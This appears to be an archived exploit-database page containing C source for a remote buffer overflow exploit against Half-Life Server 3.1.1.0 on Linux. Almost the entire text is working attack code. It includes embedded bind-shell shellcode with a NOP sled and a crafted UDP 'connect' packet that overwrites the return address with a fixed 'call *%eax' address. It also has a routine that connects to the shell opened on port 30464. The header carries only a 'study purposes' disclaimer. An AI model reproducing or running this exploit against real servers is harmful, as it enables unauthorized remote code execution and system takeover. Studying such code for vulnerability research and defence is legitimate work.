<html><head><title>Half-Life Server 3.1.1.0 Remote Buffer Overflow Exploit</title></head><pre>/*****************************************************************
 * hoagie_hlserver.c
 *
 * Remote exploit for Halflife-Servers.
 *
 * Binds a shell to port 30464/tcp and connects to it.
 *
 * Author: greuff@void.at
 *
 * This hole was found by Auriemma Luigi.
 * Uses code from the proof-of-concept DoS-exploit by Auriemma Luigi.
 *
 * Tested with HL-Server v3.1.1.0. Works only with the Linux server
 * (though making a Win32-exploit should be trivial)
 *
 * How this exploit works:
 * There is a buffer on the stack that is being overwritten with
 * our supplied shellcode. Too bad that it lies on an address that
 * has 0xFF in it (e.g. 0xbfffe000) and half life filters these
 * characters out, so we can't write the address of the shellcode
 * there. 
 * Luckily, the function that copies the shellcode into the buffer
 * has the address of the buffer in %eax when it exits. So, we jump 
 * to the location 0x0804AE93 (which is the same in ALL half life
 * servers, thanks to the fact that it is a binary distrubtion)
 * where the instruction &quot;call *%eax&quot; is located. And so the shellcode
 * gets executed...
 *
 * Credits:
 *    void.at
 *    Auriemma Luigi
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
 * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
 * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
 *
 *****************************************************************/

#include    &lt;stdio.h&gt;
#include    &lt;stdlib.h&gt;
#include    &lt;string.h&gt;
#include    &lt;time.h&gt;
#include    &lt;unistd.h&gt;
#include    &lt;sys/socket.h&gt;
#include    &lt;sys/types.h&gt;
#include    &lt;arpa/inet.h&gt;
#include    &lt;netdb.h&gt;

#define VER         &quot;0.1&quot;
#define BUFFSZ      4096
#define PORT        27015
#define INFO        &quot;\xff\xff\xff\xff&quot; \
                    &quot;infostring\n\0&quot;
#define GETCH       &quot;\xff\xff\xff\xff&quot; \
                    &quot;getchallenge\n\0&quot;
#define TIMEOUT     5    /* 5 seconds */

#define PICOFFSET 0xD0404

// 13*13+5=174
// 5*16+13+43+7*16+12=260
// 260-174 = 86 NOPs = 6*13+8
#define PAYLOAD    &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; \
                   &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; \
                   &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; \
                   &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; \
                   &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; \
                   &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; \
                   &quot;\x90\x90\x90\x90&quot; \
                   &quot;\x31\xc0\x40\x40\xcd\x80\x89\xc0\x85\xc0\x74\x06\x31&quot; \
                   &quot;\xc0\xb0\x01\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2&quot; \
                   &quot;\xb0\x66\xb3\x01\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02&quot; \
                   &quot;\x51\x8d\x0c\x24\xcd\x80\xb3\x02\xb1\x02\x31\xc9\x51&quot; \
                   &quot;\x51\x51\x80\xc1\x77\x66\x51\xb1\x02\x66\x51\x8d\x0c&quot; \
                   &quot;\x24\xb2\x10\x52\x51\x50\x8d\x0c\x24\x89\xc2\x31\xc0&quot; \
                   &quot;\xb0\x66\xcd\x80\xb3\x01\x53\x52\x8d\x0c\x24\x31\xc0&quot; \
                   &quot;\xb0\x66\x80\xc3\x03\xcd\x80\x31\xc0\x50\x50\x52\x8d&quot; \
                   &quot;\x0c\x24\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\x31&quot; \
                   &quot;\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41&quot; \
                   &quot;\x31\xc0\xb0\x3f\xcd\x80\x31\xdb\x53\x68\x6e\x2f\x73&quot; \
                   &quot;\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x31&quot; \
                   &quot;\xc9\x51\x53\x8d\x0c\x24\x31\xc0\xb0\x0b\xcd\x80\x31&quot; \
                   &quot;\xc0\xb0\x01\xcd\x80&quot; \
/* EIP */          &quot;%c%c%c%c%c%c%c%c%c%c%c%c&quot; 
	           // &quot;BBBB&quot;
/* PAYLOAD is 268 bytes! */
#define MODEL       &quot;robo&quot;
#define NAME        &quot;]I[gore&quot;
#define TOPCOLOR    &quot;25&quot;    /* 0-255, it's NOT important */
#define BOTTOMCOLOR &quot;161&quot;    /* 0-255, it's NOT important */
#define BOF1        &quot;\xff\xff\xff\xff&quot; \
                    &quot;connect %d&quot; \
                    &quot; %s \&quot;&quot; \
                    &quot;\\prot\\2&quot; \
                    &quot;\\unique\\-1&quot; \
                    &quot;\\raw\\%08lx%08lx%08lx%08lx&quot; \
                    &quot;\&quot; \&quot;&quot; \
                    &quot;\\model\\&quot; MODEL \
                    &quot;\\topcolor\\&quot; TOPCOLOR \
                    &quot;\\bottomcolor\\&quot; BOTTOMCOLOR \
                    &quot;\\rate\\9999.000000&quot; \
                    &quot;\\cl_updaterate\\20&quot; \
                    &quot;\\cl_lw\\1&quot; \
                    &quot;\\cl_lc\\1&quot; \
                    &quot;\\cl_dlmax\\128&quot; \
                    &quot;\\hud_classautokill\\1&quot; \
                    &quot;\\name\\&quot; NAME \
                    &quot;\\&quot; PAYLOAD &quot;\\value&quot; \
                    &quot;\&quot;\n&quot;
#define BUGNUM      &quot;&quot; \

int exec_sh(int sockfd)
{
        char snd[4096],rcv[4096];
        fd_set rset;
        while(1)
        {
                FD_ZERO(&amp;rset);
                FD_SET(fileno(stdin),&amp;rset);
                FD_SET(sockfd,&amp;rset);
                select(255,&amp;rset,NULL,NULL,NULL);
                if(FD_ISSET(fileno(stdin),&amp;rset))
                {
                        memset(snd,0,sizeof(snd));
                        fgets(snd,sizeof(snd),stdin);
                        write(sockfd,snd,strlen(snd));
                }
                if(FD_ISSET(sockfd,&amp;rset))
                {
                        memset(rcv,0,sizeof(rcv));
                        if(read(sockfd,rcv,sizeof(rcv))&lt;=0)
                                exit(0);
                        fputs(rcv,stdout);
                }
        }
}

int connect_sh(char *server)
{
        int sockfd,i;
        struct sockaddr_in sin;
	struct hostent *he;
        printf(&quot;Connect to the shell\n&quot;);
        fflush(stdout);
        memset(&amp;sin,0,sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=htons(30464);
	if((he=gethostbyname(server))&lt;0) perror(&quot;gethostbyname&quot;), exit(1);
	memcpy(&amp;sin.sin_addr,*(he-&gt;h_addr_list),sizeof(sin.sin_addr));
        if((sockfd=socket(AF_INET,SOCK_STREAM,0))&lt;0)
        {
                printf(&quot;Can't create socket\n&quot;);
                exit(0);
        }
        if(connect(sockfd,(struct sockaddr *)&amp;sin,sizeof(sin))&lt;0)
        {
                printf(&quot;Can't connect to the shell\n&quot;);
                exit(0);
        }
        return sockfd;
}

int getproto(unsigned char *buff);
int timeout2(int sock);
void showinfostring(unsigned char *buff, int size);
u_long resolv(char *host);
void std_err(void);


int main(int argc, char *argv[]) {
    unsigned char    buffrecv[BUFFSZ],
                    buffsend[sizeof(BOF1) + 64],
                    challenge[16],
                    bug,
                    *bofstr,
                    *stri,
                    *strf;
    struct    sockaddr_in     peer;
    int             sd,
                    err,
                    rlen,
                    bufflen,
                    proto;

    unsigned long offset;

    setbuf(stdout, NULL);

    if(argc &lt; 2) {
        printf(&quot;\nUsage: %s &lt;host&gt; &lt;port&gt;\n\n&quot;, argv[0], PORT);
        exit(1);
    }

    printf(&quot;OK team, follow my command.\n&quot;);

    srand(time(NULL));

    bofstr=BOF1;

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port = htons(atoi(argv[2]));
    // offset=strtoul(argv[3],NULL,16);
    peer.sin_family      = AF_INET;
    rlen                 = sizeof(peer);

    offset=0x0804AE93;   // call eax
    printf(&quot;Using offset 0x%08x...\n&quot;,offset);


    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd &lt; 0) std_err();



        /* GET INFORMATIONS */
    err = sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&amp;peer, rlen);
    if(err &lt; 0) std_err();
    err = timeout2(sd);
    if(err &lt; 0) {
        fputs(&quot;\nError: socket timeout\n&quot;, stdout);
        exit(1);
    }
    err = recvfrom(sd, buffrecv, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;rlen);
    if(err &lt; 0) std_err();
    buffrecv[err] = 0x00;

    proto = getproto(buffrecv);
    showinfostring(buffrecv, err);



        /* GET CHALLENGE NUMBER */
    err = sendto(sd, GETCH, sizeof(GETCH) - 1, 0, (struct sockaddr *)&amp;peer, rlen);
    if(err &lt; 0) std_err();
    err = timeout2(sd);
    if(err &lt; 0) {
        fputs(&quot;\nError: socket timeout\n&quot;, stdout);
        exit(1);
    }
    err = recvfrom(sd, buffrecv, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;rlen);
    if(err &lt; 0) std_err();
    buffrecv[err] = 0x00;

    stri = strchr(buffrecv, 0x20);
    if(!stri) stri = buffrecv;
    strf = strchr(stri + 1, 0x20);
    if(!strf) strf = buffrecv + err;
    *strf = 0x00;
    strncpy(challenge, stri, 16);
    printf(&quot;Challenge: %s\n&quot;, challenge);


    bufflen = snprintf(buffsend,
            sizeof(BOF1) + 64,
            bofstr,
            proto,
            challenge,
            (long)(rand() &lt;&lt; 1) + (rand() &amp; 0xf),    /* 31bit */
            (long)(rand() &lt;&lt; 1) + (rand() &amp; 0xf),
            (long)(rand() &lt;&lt; 1) + (rand() &amp; 0xf),
            (long)(rand() &lt;&lt; 1) + (rand() &amp; 0xf),
	    offset&amp;0xFF,(offset&gt;&gt;8)&amp;0xFF,(offset&gt;&gt;16)&amp;0xFF,(offset&gt;&gt;24)&amp;0xFF,
	    offset&amp;0xFF,(offset&gt;&gt;8)&amp;0xFF,(offset&gt;&gt;16)&amp;0xFF,(offset&gt;&gt;24)&amp;0xFF,
	    offset&amp;0xFF,(offset&gt;&gt;8)&amp;0xFF,(offset&gt;&gt;16)&amp;0xFF,(offset&gt;&gt;24)&amp;0xFF);


    if(bufflen &lt; 0) {
        fputs(&quot;\nError: cannot allocate buffer in memory\n&quot;, stdout);
        exit(1);
    }

    printf(&quot;Sending deadly packet ... stand by\n&quot;);
    err = sendto(sd, buffsend, bufflen, 0, (struct sockaddr *)&amp;peer, rlen);
    if(err &lt; 0) std_err();
    err = timeout2(sd);
    if(err &lt; 0) {
        fputs(&quot;\nResult: The remote server IS vulnerable!!!\n&quot;, stdout);
        exec_sh(connect_sh(argv[1]));
        return(0);
    }
    err = recvfrom(sd, buffrecv, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;rlen);
    if(err &lt; 0) std_err();
    buffrecv[err] = 0x00;
    printf(&quot;Connect: %s\n&quot;, buffrecv + 5);

    close(sd);


    fputs(&quot;\nResult: The server doesn't seems to be vulnerable\n\n&quot;, stdout);

    return(0);
}

int getproto(unsigned char *buff) {
    int        p;
    unsigned char    *ptr;

    ptr = strstr(buff + 23, &quot;protocol&quot;);
    if(ptr) {
        p = atoi(ptr + 9);
    } else {
        fputs(&quot;\nError: No protocol informations in the answer of the server\n&quot;, stdout);
        exit(1);
    }

    return(p);
}    

void showinfostring(unsigned char *buff, int size) {
    int        nt = 1,
            len;
    unsigned char    *string;

    fputs(&quot;\n--------------------------------------------------\n&quot;, stdout);

    if(memcmp(buff + 1, &quot;\xff\xff\xff&quot;, 3)) {
        fputs(&quot;\nError: Bad answer from the server (it is not a true server)\n&quot;, stdout);
        exit(1);
    }

    len = strlen(buff);
    if(len &lt; size) buff += len + 1;

    while(1) {
        string = strchr(buff, '\\');
        if(!string) break;

        *string = 0x00;


        /* \n or \t */
        if(!nt) {
            printf(&quot;%s: &quot;, buff);
            nt++;
        } else {
            printf(&quot;%s\n&quot;, buff);
            nt = 0;
        }


        buff = string + 1;
    }

    printf(&quot;%s\n&quot;, buff);
}

int timeout2(int sock) {
    struct    timeval    timeout;
    fd_set    fd_read;
    int    err;


    timeout.tv_sec = TIMEOUT;
    timeout.tv_usec = 0;

    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;timeout);
    if(err &lt; 0) std_err();
    if(err == 0) return(-1);
    return(0);
}

u_long resolv(char *host) {
    struct        hostent    *hp;
    u_long        host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_long *)(hp-&gt;h_addr);
    }

    return(host_ip);
}

void std_err(void)
{
        perror(&quot;\nError&quot;);
        exit(1);
}

// milw0rm.com [2005-10-16]</pre></html>